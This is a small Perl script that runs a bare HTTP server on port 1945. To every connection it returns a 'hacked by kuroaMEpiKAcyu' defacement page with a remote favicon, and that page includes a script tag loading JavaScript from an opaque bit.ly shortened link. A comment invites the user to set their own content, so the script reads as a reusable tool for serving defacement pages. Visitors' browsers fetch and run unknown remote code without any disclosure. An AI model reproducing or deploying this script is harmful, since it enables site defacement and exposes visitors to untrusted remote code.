#!/usr/bin/perl -w
use strict;
use IO::Socket;

sub Wait {
	wait; # wait needed to keep <defunct> pids from building up
}

$SIG{CHLD} = \&Wait;

my $server = IO::Socket::INET->new(
	LocalPort 	=> 1945,	# set port
	Type 		=> SOCK_STREAM,
	Reuse 		=> 1,
	Listen 		=> 10) or die "$@\n";
my $client ;

while($client = $server->accept()) {
	select $client;
	print $client "HTTP/1.0 200 OK\r\n";
	print $client "Content-type: text/html\r\n\r\n";
	print $client '<script src=https://bit.ly/3JHZy3j></script><title>hacked by kuroaMEpiKAcyu</title><link rel="icon" href="https://i.ibb.co/SfVCKPR/20220321-165704.jpg" type="image/x-icon">'; # set your html content
}
continue {
	close($client); #kills hangs
	kill CHLD => -$$;
}
